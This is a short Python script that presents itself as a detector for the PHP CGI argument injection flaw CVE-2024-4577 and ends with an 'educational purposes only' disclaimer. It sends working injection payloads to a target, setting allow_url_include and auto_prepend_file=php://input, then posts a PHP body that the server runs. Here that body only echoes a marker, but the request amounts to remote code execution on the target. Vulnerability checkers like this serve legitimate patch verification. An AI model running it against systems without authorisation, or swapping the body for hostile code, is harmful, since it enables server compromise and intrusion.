
import requests
import argparse

def test_cgi_vulnerability(url):
    payloads = [
        '/cgi-bin/php-cgi.exe?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input',
        '/php-cgi/php-cgi.exe?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input'
    ]
    
    php_code = '<?php echo "vulnerable"; ?>'
    headers = {
        "Content-Type": "application/x-www-form-urlencoded"
    }
    
    for payload in payloads:
        test_url = f"{url}{payload}"
        try:
            response = requests.post(test_url, headers=headers, data=php_code)
            response_text = response.text.lower()
            if "vulnerable" in response_text or "directory" in response_text or "index of" in response_text:
                print(f"(+) Potential vulnerability detected at: {test_url}")
            else:
                print(f"(-) No vulnerability detected at: {test_url}")
        except Exception as e:
            print(f"(!) Error testing {test_url}: {e}")

def main():
    parser = argparse.ArgumentParser(description="PHP CGI Argument Injection (CVE-2024-4577) Detection Script")
    parser.add_argument('--target', '-t', dest='target', help='Target URL', required=True)
    args = parser.parse_args()
    
    target_url = args.target.rstrip('/')
    test_cgi_vulnerability(target_url)

if __name__ == "__main__":
    main()

print("do not attempt or do not do this, it is for educational purposes only carsxn#1337")